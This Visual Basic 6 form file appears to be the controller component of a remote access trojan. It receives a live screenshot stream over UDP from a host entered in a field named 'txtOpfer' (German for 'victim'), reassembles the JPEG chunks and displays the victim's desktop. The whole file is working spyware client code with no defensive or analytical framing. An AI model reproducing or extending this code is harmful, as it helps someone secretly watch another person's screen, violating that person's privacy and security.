VERSION 5.00
Object = "{248DD890-BB45-11CF-9ABC-0080C7E7B78D}#1.0#0"; "MSWINSCK.OCX"
Begin VB.Form frmStream 
   ClientHeight    =   2895
   ClientLeft      =   60
   ClientTop       =   345
   ClientWidth     =   4815
   LinkTopic       =   "Form1"
   ScaleHeight     =   2895
   ScaleWidth      =   4815
   StartUpPosition =   3  'Windows-Standard
   Begin MSWinsockLib.Winsock UDPStream 
      Left            =   0
      Top             =   0
      _ExtentX        =   741
      _ExtentY        =   741
      _Version        =   393216
      Protocol        =   1
   End
   Begin VB.Image imgStream 
      Height          =   2895
      Left            =   60
      Stretch         =   -1  'True
      Top             =   0
      Width           =   4695
   End
End
Attribute VB_Name = "frmStream"
Attribute VB_GlobalNameSpace = False
Attribute VB_Creatable = False
Attribute VB_PredeclaredId = True
Attribute VB_Exposed = False
Dim flag As Boolean

Private Sub Form_Load()
flag = False
frmStream.Caption = "Desktopstream von: " + Server.txtOpfer.Text
With UDPStream
    .RemoteHost = Server.txtOpfer.Text
    .RemotePort = 9877
    .Bind 9566
End With
End Sub

Private Sub Form_Resize()
    imgStream.Width = frmStream.Width
    imgStream.Height = frmStream.Height
End Sub


Private Sub UDPStream_DataArrival(ByVal bytesTotal As Long)
Dim strdata As String
Dim Gros As String
UDPStream.GetData strdata
On Error Resume Next
If Left(strdata, 9) <> "endoffile" Then
        If flag = False Then
            flag = True
            Open "Stream.jpg" For Binary As #1
            UDPStream.Senddata ("x")
        Else
            Put 1, , strdata
            UDPStream.Senddata ("x")
        End If
Else
        Close #1
        flag = False
        imgStream.Picture = LoadPicture("stream.jpg")
        UDPStream.Senddata ("x")
End If
End Sub

